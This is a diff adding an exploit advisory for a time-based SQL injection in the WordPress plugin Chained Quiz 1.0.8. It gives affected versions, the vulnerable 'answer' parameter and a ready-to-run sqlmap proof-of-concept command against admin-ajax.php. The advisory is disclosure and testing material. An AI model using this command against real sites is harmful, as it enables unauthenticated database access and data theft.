@@ -1,0 +1,21 @@
+# Exploit Title: WordPress Plugin Chained Quiz 1.0.8 - 'answer' SQL Injection
+# Exploit Author: Çlirim Emini
+# Website: https://www.sentry.co.com
+# Software Link: https://wordpress.org/plugins/chained-quiz/
+# Version/s: 1.0.8 and below
+# Patched Version: 1.0.9
+# CVE : N/A
+# WPVULNDB: https://wpvulndb.com/vulnerabilities/9112
+
+# Vulnerability Description:
+# WordPress Plugin Plugin Chained Quiz before 1.0.9 allows remote unauthenticated 
+# users to execute arbitrary SQL commands via the 'answer' and 'answers' parameters.
+
+# Technical details:
+# Chained Quiz appears to be vulnerable to time-based SQL-Injection.
+# The issue lies on the $answer backend variable.
+# Privileges required: None
+
+# Proof of Concept (PoC):
+
+sqlmap -u "http://target/wp-admin/admin-ajax.php" --data="answer=1*&question_id=1&quiz_id=1&post_id=1&question_type=radio&points=0&action=chainedquiz_ajax&chainedquiz_action=answer&total_questions=1" --dbms=MySQL --technique T
